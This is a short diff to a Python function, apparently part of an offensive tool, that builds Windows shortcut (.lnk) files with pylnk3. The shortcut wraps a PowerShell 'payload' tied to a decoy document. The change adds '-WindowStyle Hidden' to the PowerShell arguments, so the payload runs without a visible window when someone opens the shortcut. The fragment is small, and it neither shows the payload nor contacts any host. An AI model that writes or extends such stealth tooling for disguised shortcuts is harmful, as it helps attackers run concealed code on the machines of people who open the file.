@@ -54,7 +54,7 @@ def write_lnk_using_document(target, document, payload, overwrite = False):
         if not script:
             raise Exception("Could not wrap powershell script.")
 
-        script_argument = ' -Command ' + script
+        script_argument = ' -WindowStyle Hidden -Command ' + script
 
         pylnk3.for_file(
             target_file=target,
